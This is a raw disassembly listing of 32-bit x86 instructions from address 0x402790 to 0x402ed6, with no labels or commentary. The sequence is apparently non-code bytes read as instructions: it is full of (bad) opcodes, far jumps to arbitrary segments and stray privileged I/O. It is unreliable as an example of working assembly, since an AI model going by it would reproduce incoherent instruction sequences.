  402790:	add    BYTE PTR [ebx-0x537ddf8],al
  402796:	sbb    BYTE PTR [eax-0x69],ch
  402799:	repz xor al,BYTE PTR ds:0xd1cc40f8
  4027a0:	jecxz  0x402782
  4027a2:	das    
  4027a3:	mov    edx,0x3198fbe0
  4027a8:	or     al,0x83
  4027aa:	or     cl,al
  4027ac:	test   eax,0xa2c206fd
  4027b1:	xchg   esp,eax
  4027b2:	adc    eax,0xf33868b9
  4027b7:	add    dh,BYTE PTR [edi]
  4027b9:	mov    cl,0x5
  4027bb:	cs jmp 0x6b8a:0x5fc1f6e5
  4027c3:	popa   
  4027c4:	call   0x5eaa:0x78c5b0fa
  4027cb:	jo     0x40280f
  4027cd:	dec    ecx
  4027ce:	jnp    0x4027a1
  4027d0:	sbb    eax,0x95f3110b
  4027d5:	push   edx
  4027d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027d7:	xor    DWORD PTR [esp+ecx*1+0x19],eax
  4027db:	ss mov esi,0x89a1a168
  4027e1:	pushf  
  4027e2:	add    al,0x2f
  4027e4:	add    BYTE PTR [eax-0xb4b27ab],0x59
  4027eb:	out    dx,al
  4027ec:	jns    0x4027ac
  4027ee:	dec    ecx
  4027ef:	dec    ecx
  4027f0:	adc    eax,DWORD PTR [edi+ebx*2-0x7f1f98e]
  4027f7:	sbb    eax,0xc61c2dbf
  4027fc:	enter  0xc5c3,0xee
  402800:	or     eax,0x13978ba2
  402805:	scas   eax,DWORD PTR es:[edi]
  402806:	mov    edx,0xb9e7c08d
  40280b:	add    DWORD PTR [edx+0x12],0x7b
  40280f:	stos   BYTE PTR es:[edi],al
  402810:	cmp    BYTE PTR [edi+0x16113d1f],dh
  402816:	enter  0x1049,0x87
  40281a:	lods   al,BYTE PTR ds:[esi]
  40281b:	mov    edx,esi
  40281d:	shl    dh,cl
  40281f:	(bad)  [ecx]
  402821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402822:	cwde   
  402823:	push   esp
  402824:	and    ch,ch
  402826:	sti    
  402827:	stos   DWORD PTR es:[edi],eax
  402828:	mov    ds:0x900c55b1,eax
  40282d:	add    DWORD PTR [ebx+0x50f4741f],edx
  402833:	scas   al,BYTE PTR es:[edi]
  402834:	sub    cl,BYTE PTR [ecx]
  402836:	inc    ebx
  402837:	jno    0x4027c3
  402839:	xor    al,0x8b
  40283b:	adc    al,0x3d
  40283d:	push   esi
  40283e:	neg    ecx
  402840:	sub    BYTE PTR [ecx],0x69
  402843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402844:	scas   eax,DWORD PTR es:[edi]
  402845:	jmp    0x4027c9
  402847:	imul   esp,DWORD PTR gs:[edx+0x67],0xffffffc4
  40284c:	mov    dh,0xc5
  40284e:	pusha  
  40284f:	fldenv [ebx]
  402851:	pop    esp
  402852:	inc    edx
  402853:	loope  0x4028c9
  402855:	pop    ss
  402856:	rcr    BYTE PTR [eax-0x58],cl
  402859:	fs push ecx
  40285b:	into   
  40285c:	imul   eax,DWORD PTR ds:0x27cc3c29,0xffffffd0
  402863:	pop    edx
  402864:	add    edi,DWORD PTR [edx]
  402866:	ins    DWORD PTR es:[edi],dx
  402867:	cli    
  402868:	jne    0x40286e
  40286a:	out    0x44,al
  40286c:	stos   BYTE PTR es:[edi],al
  40286d:	fist   DWORD PTR [esi+0x63d0d83c]
  402873:	push   esp
  402874:	mov    eax,ds:0xa2ac47d8
  402879:	jnp    0x402835
  40287b:	cdq    
  40287c:	cmp    DWORD PTR [eax],esp
  40287e:	cwde   
  40287f:	mov    dh,0xc9
  402881:	aaa    
  402882:	xor    al,ah
  402884:	pop    esp
  402885:	and    ebx,DWORD PTR [esi]
  402887:	add    eax,0x7b5cf7ae
  40288c:	test   BYTE PTR ds:0x3046e677,ah
  402892:	push   0xe1994e9f
  402897:	enter  0xa092,0x59
  40289b:	mov    bl,0x25
  40289d:	test   eax,0x28bed78c
  4028a2:	test   DWORD PTR [esi-0x40],esp
  4028a5:	cmp    al,0xd2
  4028a7:	mov    ds:0xc2dee1f5,ax
  4028ad:	stos   DWORD PTR es:[edi],eax
  4028ae:	xor    al,0x1
  4028b0:	xchg   ebp,eax
  4028b1:	mov    bh,0xd3
  4028b3:	mov    esi,0xcfc3220b
  4028b8:	ja     0x4028df
  4028ba:	pop    ss
  4028bb:	jmp    0x4028b4
  4028bd:	les    edx,FWORD PTR [ebx+esi*2+0x5365a063]
  4028c4:	pop    ss
  4028c5:	shl    DWORD PTR [edx],0x8f
  4028c8:	xchg   ecx,eax
  4028c9:	sar    DWORD PTR [esi+0x1046178a],cl
  4028cf:	jo     0x4028f4
  4028d1:	lea    edx,[ecx]
  4028d3:	outs   dx,BYTE PTR ds:[esi]
  4028d4:	sar    DWORD PTR [esi],cl
  4028d6:	sbb    bh,BYTE PTR [ebx+ecx*1]
  4028d9:	ret    0x2b6b
  4028dc:	(bad)  
  4028de:	push   0x3e0dbd07
  4028e3:	push   ss
  4028e4:	mov    fs,WORD PTR [ecx]
  4028e6:	call   DWORD PTR [edx-0x73ac766b]
  4028ec:	fsubr  st,st(6)
  4028ee:	xchg   ebx,eax
  4028ef:	fild   QWORD PTR [esi-0xaab4243]
  4028f5:	test   eax,0xcd825b8f
  4028fa:	mov    ebx,0x4f400583
  4028ff:	jp     0x4028ce
  402901:	or     esp,ebx
  402903:	jb     0x40292a
  402905:	xchg   esp,eax
  402906:	enter  0xb4f2,0x0
  40290a:	cdq    
  40290b:	add    ecx,ecx
  40290d:	inc    edi
  40290e:	push   edi
  40290f:	pop    ecx
  402910:	cwde   
  402911:	push   ss
  402912:	pop    ebp
  402913:	hlt    
  402914:	ss es pop edx
  402917:	jns    0x402980
  402919:	push   esi
  40291a:	dec    ebp
  40291b:	xor    BYTE PTR [ebp+0x6f],ch
  40291e:	jns    0x40295d
  402920:	nop
  402921:	push   edx
  402922:	jnp    0x402904
  402924:	and    dl,BYTE PTR [ebx]
  402926:	mov    bh,0x5e
  402928:	iret   
  402929:	ins    DWORD PTR es:[edi],dx
  40292a:	or     BYTE PTR [ebp+0x15],bh
  40292d:	cmp    BYTE PTR [ebp-0x6eb67383],bh
  402933:	sub    edi,DWORD PTR [ebp+0x3c]
  402936:	dec    edi
  402937:	retf   0xfb1a
  40293a:	and    ecx,DWORD PTR [ecx+0x23]
  40293d:	push   0xffffff9d
  40293f:	dec    esp
  402940:	mov    al,0x88
  402942:	(bad)  
  402943:	call   DWORD PTR [ecx-0xa]
  402946:	sbb    edx,esi
  402948:	sahf   
  402949:	mov    dl,0xda
  40294b:	xlat   BYTE PTR ds:[ebx]
  40294c:	inc    esp
  40294d:	jbe    0x402963
  40294f:	imul   edx,DWORD PTR [ebx],0xffffffa2
  402952:	popa   
  402953:	sar    DWORD PTR [edi+0x44],0x7b
  402957:	scas   eax,DWORD PTR es:[edi]
  402958:	jno    0x4028fa
  40295a:	inc    edi
  40295b:	xchg   DWORD PTR [edx],esp
  40295d:	sbb    BYTE PTR [eax+ebp*2],bl
  402960:	xor    DWORD PTR [ecx-0x48],edi
  402963:	mov    BYTE PTR [esp+ebx*2-0x4a],0x0
  402968:	lock add DWORD PTR [ebx+0x25],edi
  40296c:	fdiv   st(3),st
  40296e:	dec    edi
  40296f:	loope  0x4029c8
  402971:	call   0x256e:0x24426e1
  402978:	sub    BYTE PTR [ebx-0x72],0xf7
  40297c:	rcl    DWORD PTR [edi+eiz*4+0x62b2e6bf],0x49
  402984:	mov    edx,0xbe39b1e9
  402989:	test   DWORD PTR [ecx-0x2e15c11a],ebx
  40298f:	add    DWORD PTR [ebx+0x44],esi
  402992:	lahf   
  402993:	or     edx,ebx
  402995:	mov    bl,0x1a
  402997:	xlat   BYTE PTR ds:[ebx]
  402998:	add    DWORD PTR [ebx],edi
  40299a:	ins    DWORD PTR es:[edi],dx
  40299b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40299c:	mov    al,ds:0x5a83fde
  4029a1:	dec    edi
  4029a2:	loopne 0x40294c
  4029a4:	and    dh,BYTE PTR [ebp+0x1119532f]
  4029aa:	cmp    BYTE PTR [edi-0x6e3ded9a],al
  4029b0:	jae    0x40295a
  4029b2:	cs push ds
  4029b4:	(bad)  
  4029b5:	mov    ebx,0x14ac0f89
  4029ba:	push   edx
  4029bb:	mov    cl,0x80
  4029bd:	mov    dh,0x5e
  4029bf:	in     eax,dx
  4029c0:	mov    ah,0xfa
  4029c2:	push   edi
  4029c3:	add    DWORD PTR [eax-0x7c],esp
  4029c6:	xlat   BYTE PTR ds:[ebx]
  4029c7:	adc    DWORD PTR [edx-0x1d],0x1bcc1c4b
  4029ce:	push   cs
  4029cf:	dec    esi
  4029d0:	leave  
  4029d1:	mov    edx,0x493bfc76
  4029d6:	pushf  
  4029d7:	jb     0x40297e
  4029d9:	pop    es
  4029da:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4029dc:	add    BYTE PTR [ebx-0x2],dl
  4029df:	xchg   BYTE PTR [edi],cl
  4029e1:	shl    DWORD PTR [edx],cl
  4029e3:	lods   eax,DWORD PTR ds:[esi]
  4029e4:	sbb    eax,DWORD PTR [edx-0x2ca9e382]
  4029ea:	retf   0x389c
  4029ed:	and    al,0x70
  4029ef:	mov    edx,0xbc77e6d0
  4029f4:	push   esi
  4029f5:	in     al,0x34
  4029f7:	sbb    edx,DWORD PTR [edx-0x3c203160]
  4029fd:	mov    ds:0x76a62726,eax
  402a02:	icebp  
  402a03:	into   
  402a04:	xchg   ebx,eax
  402a05:	jbe    0x402a83
  402a07:	jl     0x402a1e
  402a09:	out    dx,eax
  402a0a:	cs push eax
  402a0c:	sbb    ecx,ebx
  402a0e:	mov    dh,0x2
  402a10:	popa   
  402a11:	dec    eax
  402a12:	xor    al,0x59
  402a14:	xchg   ebp,eax
  402a15:	call   0x7aa8d64b
  402a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a1b:	xchg   edi,eax
  402a1c:	dec    ecx
  402a1d:	loopne 0x402a00
  402a1f:	and    bl,BYTE PTR [edx-0x73]
  402a22:	adc    DWORD PTR [ebx+0xa],ebp
  402a25:	jmp    0xb646:0x63e06eb1
  402a2c:	loopne 0x402a3d
  402a2e:	lods   eax,DWORD PTR ds:[esi]
  402a2f:	sahf   
  402a30:	add    eax,0x54680608
  402a35:	jnp    0x402a93
  402a37:	sub    bl,BYTE PTR [eax-0x77]
  402a3a:	fistp  WORD PTR [eax]
  402a3c:	pop    esi
  402a3d:	push   ebx
  402a3e:	es lock call 0x325c55c8
  402a45:	or     eax,0x15fbc943
  402a4a:	aaa    
  402a4b:	popf   
  402a4c:	dec    esi
  402a4d:	push   edi
  402a4e:	push   edx
  402a4f:	push   eax
  402a50:	enter  0x491b,0x2c
  402a54:	stos   BYTE PTR es:[edi],al
  402a55:	loopne 0x402a0a
  402a57:	jle    0x402a6d
  402a59:	jp     0x402a8f
  402a5b:	les    edx,FWORD PTR ds:0x132cf4c
  402a61:	fs jp  0x402a61
  402a64:	out    0xa6,eax
  402a66:	xchg   ebx,eax
  402a67:	outs   dx,BYTE PTR ds:[esi]
  402a68:	nop
  402a69:	pop    es
  402a6a:	mov    ecx,0x741365db
  402a6f:	push   esp
  402a70:	in     eax,0x30
  402a72:	push   ebp
  402a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a74:	retf   0xfb44
  402a77:	sbb    eax,0xb541a198
  402a7c:	sub    al,BYTE PTR ds:0xd7f7383
  402a82:	pop    ds
  402a83:	xchg   edx,eax
  402a84:	aad    0x50
  402a86:	retf   
  402a87:	out    dx,eax
  402a88:	shr    BYTE PTR [edi],0xb5
  402a8b:	std    
  402a8c:	out    dx,al
  402a8d:	test   edi,ecx
  402a8f:	call   0x14d7c1db
  402a94:	test   eax,0xc72d0c59
  402a99:	test   BYTE PTR [edi-0x20],dh
  402a9c:	pop    eax
  402a9d:	test   BYTE PTR [ebp+0x64],dh
  402aa0:	test   al,ah
  402aa2:	call   0x7feeaf3f
  402aa7:	rol    BYTE PTR [edx+eiz*1],0x4a
  402aab:	loope  0x402b29
  402aad:	test   DWORD PTR [ecx+eax*4],ecx
  402ab0:	call   0xd284a66e
  402ab5:	aaa    
  402ab6:	stos   DWORD PTR es:[edi],eax
  402ab7:	(bad)  
  402ab8:	cmp    eax,0xeb025e87
  402abd:	sbb    BYTE PTR [esi+0x42189c34],ch
  402ac3:	inc    ecx
  402ac4:	xchg   ebp,eax
  402ac5:	inc    edx
  402ac6:	inc    edi
  402ac7:	icebp  
  402ac8:	inc    esp
  402ac9:	jb     0x402a99
  402acb:	out    0xe2,al
  402acd:	jnp    0x402b42
  402acf:	out    dx,al
  402ad0:	retf   
  402ad1:	lods   eax,DWORD PTR ds:[esi]
  402ad2:	(bad)  
  402ad3:	mov    esp,0x2c3dcbd4
  402ad8:	pusha  
  402ad9:	lahf   
  402ada:	pushf  
  402adb:	in     eax,dx
  402adc:	cmp    eax,0x187159e4
  402ae1:	ror    BYTE PTR [edi-0x12],cl
  402ae4:	xchg   ebx,eax
  402ae5:	int3   
  402ae6:	inc    ebx
  402ae7:	inc    edx
  402ae8:	sub    bl,BYTE PTR [edx+0x21]
  402aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402aec:	mov    dl,0xd0
  402aee:	aas    
  402aef:	sub    DWORD PTR [edi],edi
  402af1:	lahf   
  402af2:	into   
  402af3:	cs into 
  402af5:	lods   al,BYTE PTR ds:[esi]
  402af6:	jae    0x402ac9
  402af8:	lock (bad) 
  402afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402afb:	stos   DWORD PTR es:[edi],eax
  402afc:	int    0x2
  402afe:	sbb    eax,0x4d91bb8d
  402b03:	mov    dh,0x1b
  402b05:	cmp    al,0x4d
  402b07:	jge    0x402b3c
  402b09:	shl    dl,1
  402b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b0d:	mov    al,0x9a
  402b0f:	out    0xc1,eax
  402b11:	iret   
  402b12:	retf   
  402b13:	pop    ds
  402b14:	call   0x24af2627
  402b19:	scas   eax,DWORD PTR es:[edi]
  402b1a:	outs   dx,BYTE PTR ds:[esi]
  402b1b:	and    dl,ah
  402b1d:	test   al,0x4f
  402b1f:	dec    ebp
  402b20:	sahf   
  402b21:	jno    0x402af6
  402b23:	retf   
  402b24:	cmp    DWORD PTR [ecx-0x408d9795],ecx
  402b2a:	mov    ebx,0x240ff3e3
  402b2f:	and    al,0xba
  402b31:	aaa    
  402b32:	xor    esi,esi
  402b34:	sub    ecx,DWORD PTR [ecx-0x3d]
  402b37:	loope  0x402b8b
  402b39:	test   BYTE PTR [ebp-0x215071cb],dh
  402b3f:	jnp    0x402b06
  402b41:	scas   al,BYTE PTR es:[edi]
  402b42:	adc    BYTE PTR fs:[esi+0x3e],cl
  402b46:	push   edi
  402b47:	xor    eax,0x9e7e2de8
  402b4c:	out    dx,al
  402b4d:	push   ebp
  402b4e:	out    dx,eax
  402b4f:	wbinvd 
  402b51:	into   
  402b52:	sbb    eax,ebp
  402b54:	fwait
  402b55:	dec    ecx
  402b56:	mov    al,0xb1
  402b58:	out    0x8e,al
  402b5a:	inc    ebx
  402b5b:	shl    ch,1
  402b5d:	rol    ah,0x26
  402b60:	xchg   esi,eax
  402b61:	loop   0x402b93
  402b63:	(bad)  
  402b64:	xchg   BYTE PTR [eax-0x1e5a9ac2],al
  402b6a:	fs pop esp
  402b6c:	out    0x9f,eax
  402b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b6f:	idiv   BYTE PTR [ebx]
  402b71:	adc    eax,0x69a6bd7a
  402b76:	fs xchg dl,dl
  402b79:	lds    edi,FWORD PTR [esi-0x68]
  402b7c:	ret    0x25ed
  402b7f:	mov    eax,0x8824ff35
  402b84:	pop    ecx
  402b85:	(bad)  
  402b87:	mov    esp,0xd5aa1861
  402b8c:	test   DWORD PTR [edx],ecx
  402b8e:	ja     0x402b9a
  402b90:	mov    dh,0xf1
  402b92:	or     ch,BYTE PTR [ebx]
  402b94:	imul   ebp,DWORD PTR [eax+0x23],0x8d83cdb8
  402b9b:	gs pop edx
  402b9d:	pop    esp
  402b9e:	loopne 0x402bc9
  402ba0:	sbb    bl,BYTE PTR [ebx+0x4b]
  402ba3:	fst    DWORD PTR [ebp+0x47]
  402ba6:	cmp    eax,0x7205f484
  402bab:	pop    ebp
  402bac:	xlat   BYTE PTR ds:[ebx]
  402bad:	pop    esp
  402bae:	pop    ss
  402baf:	popa   
  402bb0:	(bad)  
  402bb1:	cmp    al,0xf3
  402bb3:	push   ss
  402bb4:	cmp    edi,edx
  402bb6:	mov    edi,ecx
  402bb8:	push   esp
  402bb9:	fmul   QWORD PTR [esi-0x46]
  402bbc:	shl    DWORD PTR [edx+0x60322773],1
  402bc2:	(bad)  [edi]
  402bc4:	daa    
  402bc5:	mov    ebp,0x5047989
  402bca:	ret    0xb091
  402bcd:	jl     0x402c1f
  402bcf:	dec    eax
  402bd0:	pop    ss
  402bd1:	sbb    bh,BYTE PTR [esi+0x68]
  402bd4:	and    bh,BYTE PTR [eax]
  402bd6:	xchg   ebp,eax
  402bd7:	xchg   ecx,eax
  402bd8:	outs   dx,BYTE PTR ds:[esi]
  402bd9:	mov    BYTE PTR [ebx],dl
  402bdb:	imul   ebx,edi,0xd9a5ef54
  402be1:	inc    ecx
  402be2:	les    edx,FWORD PTR [ebx-0x50]
  402be5:	cli    
  402be6:	fidiv  DWORD PTR [eax+0x7131296e]
  402bec:	sahf   
  402bed:	sub    al,0xf1
  402bef:	pop    ecx
  402bf0:	fsub   st(7),st
  402bf2:	and    BYTE PTR [esi-0x67],cl
  402bf5:	cwde   
  402bf6:	jmp    0x402be5
  402bf8:	loopne 0x402c52
  402bfa:	xchg   ebx,eax
  402bfb:	push   0x253715e4
  402c00:	xchg   ecx,eax
  402c01:	mov    ss,WORD PTR [ecx]
  402c03:	mov    cl,0xcf
  402c05:	push   edx
  402c06:	je     0x402c2a
  402c08:	inc    edx
  402c09:	loope  0x402bfe
  402c0b:	mov    ss,WORD PTR [esi]
  402c0d:	ret    
  402c0e:	inc    esp
  402c0f:	xor    eax,0xfa294823
  402c14:	mov    al,0xb7
  402c16:	ret    
  402c17:	in     al,dx
  402c18:	xchg   DWORD PTR [ebx+0x7d],ecx
  402c1b:	cmp    eax,0x796dd47b
  402c20:	dec    ebp
  402c21:	cs mov bl,0x80
  402c24:	gs inc esp
  402c26:	fadd   st(7),st
  402c28:	pop    ecx
  402c29:	(bad)  
  402c2a:	push   esi
  402c2b:	(bad)  
  402c2c:	sbb    al,0xa
  402c2e:	dec    edx
  402c2f:	adc    al,0x3c
  402c31:	mov    ebx,0x9045590b
  402c36:	mov    eax,0x21dbd333
  402c3b:	outs   dx,BYTE PTR ds:[esi]
  402c3c:	jns    0x402bdf
  402c3e:	jle    0x402bdb
  402c40:	test   DWORD PTR [ebx],0x1c807a3c
  402c46:	lds    ebx,FWORD PTR [edi-0x5c]
  402c49:	mov    bh,0xae
  402c4b:	mov    ch,cl
  402c4d:	or     bh,BYTE PTR [esi-0x2ab69a14]
  402c53:	test   eax,0x1d51e182
  402c58:	mov    esp,0x7a9cacfb
  402c5d:	in     eax,dx
  402c5e:	pop    esp
  402c5f:	inc    edi
  402c60:	rol    BYTE PTR [edx-0x733ba982],cl
  402c66:	inc    BYTE PTR [esi]
  402c68:	bound  ecx,QWORD PTR [eax-0x13]
  402c6b:	push   ebx
  402c6c:	test   BYTE PTR [edi+0x77],0x2d
  402c70:	sub    DWORD PTR [esi+0x2a],ecx
  402c73:	or     al,0x54
  402c75:	cmc    
  402c76:	es pop eax
  402c78:	ins    DWORD PTR es:[edi],dx
  402c79:	(bad)  [edi-0x3a24e83]
  402c7f:	in     eax,dx
  402c80:	std    
  402c81:	cmp    DWORD PTR [ebx+0xe],esi
  402c84:	sbb    al,0x6
  402c86:	mov    esi,0xf53fa1f9
  402c8b:	inc    edi
  402c8c:	dec    eax
  402c8d:	mov    WORD PTR ds:0xa3286f8,es
  402c93:	imul   BYTE PTR [edi+0x3c]
  402c96:	xchg   ebp,eax
  402c97:	xchg   ebx,eax
  402c98:	jo     0x402d10
  402c9a:	xchg   BYTE PTR [ebp+0x44972794],bh
  402ca0:	push   ecx
  402ca1:	pop    ss
  402ca2:	dec    esi
  402ca3:	xlat   BYTE PTR ds:[ebx]
  402ca4:	xor    DWORD PTR [esi-0x17],0x25f0ec22
  402cab:	or     dh,BYTE PTR [eax-0x10]
  402cae:	aas    
  402caf:	xchg   esi,eax
  402cb0:	loop   0x402ca7
  402cb2:	sti    
  402cb3:	xchg   edi,eax
  402cb4:	jl     0x402d35
  402cb6:	add    ebp,eax
  402cb8:	in     al,dx
  402cb9:	(bad)  
  402cba:	jbe    0x402c4a
  402cbc:	add    DWORD PTR [ecx],esi
  402cbe:	sub    BYTE PTR [edx],dl
  402cc0:	icebp  
  402cc1:	jle    0x402d21
  402cc3:	loopne 0x402caa
  402cc5:	gs dec esp
  402cc7:	and    bl,cl
  402cc9:	loop   0x402d48
  402ccb:	sbb    al,0x5e
  402ccd:	push   0xffffffc6
  402ccf:	sbb    eax,DWORD PTR [ecx+0x801cd34]
  402cd5:	mov    al,ds:0x8306485d
  402cda:	pop    edi
  402cdb:	pusha  
  402cdc:	fs push cs
  402cde:	pop    ebx
  402cdf:	retf   0xd3a2
  402ce2:	aam    0x8c
  402ce4:	and    DWORD PTR [esi],ecx
  402ce6:	push   edx
  402ce7:	xchg   ebx,eax
  402ce8:	pop    edi
  402ce9:	and    dh,BYTE PTR [esi-0x7a]
  402cec:	sbb    esp,DWORD PTR ds:[ebp-0x33401847]
  402cf3:	push   ebp
  402cf4:	inc    eax
  402cf5:	stos   BYTE PTR es:[edi],al
  402cf6:	xchg   ah,ch
  402cf8:	loop   0x402c8f
  402cfa:	and    eax,0xabbd3566
  402cff:	inc    ebp
  402d00:	iret   
  402d01:	sub    eax,0x3c004538
  402d06:	ja     0x402cb9
  402d08:	outs   dx,DWORD PTR ds:[esi]
  402d09:	push   ebp
  402d0a:	inc    ebp
  402d0b:	call   0x5e3f1a1f
  402d10:	popa   
  402d11:	je     0x402d67
  402d13:	adc    ebx,ebx
  402d15:	ss mov dh,0x6a
  402d18:	popa   
  402d19:	sbb    al,0x23
  402d1b:	in     al,dx
  402d1c:	test   eax,0x1b9b1a8b
  402d21:	lea    eax,[edi-0x33]
  402d24:	(bad)  
  402d25:	out    dx,eax
  402d26:	retf   0x5dc6
  402d29:	push   ecx
  402d2a:	xchg   BYTE PTR [esi+ebx*1-0x4a],cl
  402d2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d2f:	xchg   esp,eax
  402d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d31:	mov    fs,WORD PTR fs:[edi]
  402d34:	test   BYTE PTR [edi],ch
  402d36:	fcmovbe st,st(1)
  402d38:	mov    eax,ds:0xd13d47fc
  402d3d:	dec    BYTE PTR [edx]
  402d3f:	xlat   BYTE PTR ds:[ebx]
  402d40:	leave  
  402d41:	and    ebp,DWORD PTR [esi-0x1f]
  402d44:	lock adc esi,ebx
  402d47:	jns    0x402d9c
  402d49:	xchg   BYTE PTR [eax+0x533dcc41],ch
  402d4f:	hlt    
  402d50:	mov    ds:0x15cca00e,eax
  402d55:	mov    ecx,0xc2cf89f5
  402d5a:	mov    BYTE PTR [eax+ebp*4-0x14],ah
  402d5e:	in     eax,0xed
  402d60:	les    ebp,FWORD PTR [eax]
  402d62:	out    0x8b,eax
  402d64:	xor    eax,0x94a8dd14
  402d69:	shr    BYTE PTR [esi-0x53f05827],0x49
  402d70:	push   ebp
  402d71:	mov    al,ds:0x389241c1
  402d76:	js     0x402d41
  402d78:	sbb    ecx,edx
  402d7a:	sti    
  402d7b:	mov    bl,0xa8
  402d7d:	fmul   QWORD PTR [edi]
  402d7f:	or     ebx,DWORD PTR [ebx]
  402d81:	and    eax,0x83492b8e
  402d86:	pop    ebp
  402d87:	leave  
  402d88:	fadd   DWORD PTR [ebx-0x5d]
  402d8b:	lods   eax,DWORD PTR ds:[esi]
  402d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d8d:	pextrw esp,(bad),0xc5
  402d8f:	and    al,BYTE PTR [eax+0x6d]
  402d92:	push   ebp
  402d93:	in     al,0xb5
  402d95:	pusha  
  402d96:	in     eax,dx
  402d97:	enter  0x613a,0xa5
  402d9b:	jmp    0x91ed:0xf7fc0bc1
  402da2:	pop    es
  402da3:	sub    eax,0xd84f271a
  402da8:	cmp    eax,0xa44e5fd0
  402dad:	(bad)  
  402daf:	fstp   TBYTE PTR ds:0xd48496d9
  402db5:	outs   dx,BYTE PTR ds:[esi]
  402db6:	xor    eax,0xa59cd9b8
  402dbb:	lods   eax,DWORD PTR ds:[esi]
  402dbc:	and    ebp,DWORD PTR [edi+0x893957b]
  402dc2:	jl     0x402d6f
  402dc4:	aam    0xbd
  402dc6:	xor    eax,DWORD PTR [edi]
  402dc8:	dec    edi
  402dc9:	dec    ebp
  402dca:	clc    
  402dcb:	daa    
  402dcc:	and    esi,edx
  402dce:	jnp    0x402e1c
  402dd0:	mov    al,ds:0x49190fdf
  402dd5:	inc    ebx
  402dd6:	mov    edi,0xb9560011
  402ddb:	shl    BYTE PTR [ebp-0x36],0xad
  402ddf:	jns    0x402d64
  402de1:	in     al,dx
  402de2:	pop    esp
  402de3:	or     DWORD PTR [ebx+0x7a],edx
  402de6:	les    esi,FWORD PTR [esi+0x2a1363b0]
  402dec:	lods   al,BYTE PTR ds:[esi]
  402ded:	add    eax,DWORD PTR [esi+0x7328cf54]
  402df3:	inc    esi
  402df4:	and    cl,BYTE PTR [ebx]
  402df6:	pop    edi
  402df7:	jae    0x402e36
  402df9:	xchg   ebx,eax
  402dfa:	push   ebp
  402dfb:	int3   
  402dfc:	fs movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  402dff:	xor    eax,0x6ff59346
  402e04:	lods   al,BYTE PTR ds:[esi]
  402e05:	mov    bh,BYTE PTR [ebx]
  402e07:	aad    0xb4
  402e09:	sub    BYTE PTR [eax],dl
  402e0b:	mov    edi,esp
  402e0d:	js     0x402de2
  402e0f:	(bad)  
  402e10:	xchg   ecx,eax
  402e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e12:	xchg   edi,eax
  402e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e14:	ins    DWORD PTR es:[edi],dx
  402e15:	push   ds
  402e16:	cmp    esi,edi
  402e18:	stc    
  402e19:	enter  0x3db1,0xce
  402e1d:	pusha  
  402e1e:	pop    esp
  402e1f:	or     eax,0xa27c2489
  402e24:	xchg   DWORD PTR [edi-0x341b03d1],esp
  402e2a:	xor    ecx,DWORD PTR [ebx]
  402e2c:	ja     0x402eac
  402e2e:	sahf   
  402e2f:	out    dx,eax
  402e30:	sub    esp,DWORD PTR [esi+0x60]
  402e33:	cmp    eax,0x4413c27e
  402e38:	dec    esi
  402e39:	mov    ecx,0x5f7d3ee5
  402e3e:	xchg   edi,eax
  402e3f:	or     BYTE PTR [edi-0x1b6822c0],ch
  402e45:	gs jp  0x402e55
  402e48:	or     ah,cl
  402e4a:	iret   
  402e4b:	push   edi
  402e4c:	call   0x2b6d90b1
  402e51:	xor    esp,ecx
  402e53:	add    ah,bh
  402e55:	ins    BYTE PTR es:[edi],dx
  402e56:	aam    0xbb
  402e58:	(bad)  
  402e59:	sbb    eax,edi
  402e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e5c:	test   BYTE PTR [eax+esi*4],dh
  402e5f:	adc    bh,BYTE PTR [edx]
  402e61:	xchg   edi,eax
  402e62:	sti    
  402e63:	add    eax,0x64de6fda
  402e68:	jmp    0x70fe:0xae57fa2e
  402e6f:	cmp    eax,0x121f12e9
  402e74:	fmul   QWORD PTR [eax-0x4c538184]
  402e7a:	bound  ebx,QWORD PTR [bx+di]
  402e7d:	sbb    esi,DWORD PTR [edi-0x76]
  402e80:	pusha  
  402e81:	sub    BYTE PTR [ebx+esi*8+0xb06680d],0x98
  402e89:	mov    ebx,0x34cf5f01
  402e8e:	jbe    0x402e31
  402e90:	mov    WORD PTR [edi],?
  402e92:	inc    ebx
  402e93:	icebp  
  402e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e95:	fisttp QWORD PTR [eax+0x59]
  402e98:	adc    dl,BYTE PTR [eax]
  402e9a:	(bad)  
  402e9b:	leave  
  402e9c:	pop    es
  402e9d:	dec    ecx
  402e9e:	gs mov ah,0xbc
  402ea1:	cli    
  402ea2:	jmp    0xce9d:0xb4a02051
  402ea9:	mov    dl,0x74
  402eab:	shl    DWORD PTR [edx-0x68],1
  402eae:	pushf  
  402eaf:	das    
  402eb0:	lds    esp,FWORD PTR [ebp-0x55]
  402eb3:	or     al,0x24
  402eb5:	push   eax
  402eb6:	inc    esi
  402eb7:	pop    es
  402eb8:	test   al,0xfe
  402eba:	pop    es
  402ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ebc:	push   edi
  402ebd:	call   0xbb87:0x8c4005af
  402ec4:	iret   
  402ec5:	fisttp DWORD PTR [edx+ecx*4]
  402ec8:	jns    0x402efd
  402eca:	mov    ecx,0x8e0bc0b6
  402ecf:	ss inc esp
  402ed1:	xchg   esp,eax
  402ed2:	sub    ch,BYTE PTR [ebp+ecx*1-0x1b]
  402ed6:	cmp    al,ch
